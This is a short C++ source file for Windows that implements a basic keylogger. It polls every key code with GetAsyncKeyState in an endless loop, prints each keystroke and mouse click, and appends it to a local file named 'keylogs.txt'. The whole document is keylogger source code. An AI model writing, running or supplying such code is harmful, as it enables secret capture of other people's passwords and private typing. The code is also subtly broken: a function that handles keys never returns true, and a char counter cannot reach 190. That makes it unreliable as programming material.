#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text)
{
    ofstream logfile;
    logfile.open("keylogs.txt", fstream::app);
    logfile << text;
    logfile.close();
}
bool KeyIsListened(int iKey)
{
    switch (iKey)
    {
    case VK_SPACE:
        cout << " ";
        WriteToLog(" ");
        break;
    case VK_RETURN:
        cout << "\n";
        WriteToLog("\n");
        break;
    case VK_SHIFT:
        cout << "Shift";
        WriteToLog("Shift");
        break;
    case VK_BACK:
        cout << "\b";
        WriteToLog("\b");
        break;
    case VK_RBUTTON:
        cout << "Right Click";
        WriteToLog("Right Click");
        break;
    case VK_LBUTTON:
        cout << "Left Click";
        WriteToLog("Left Click");
        break;
    default:
        return false;
    }
}
int main()
{
    char key;
    while (true)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeyIsListened(key) == false)
                {
                    cout << key;
                    ofstream logfile;
                    logfile.open("keylogs.txt", fstream::app);
                    logfile << key;
                    logfile.close();
                }
            }
        }
    }
    return 0;
}
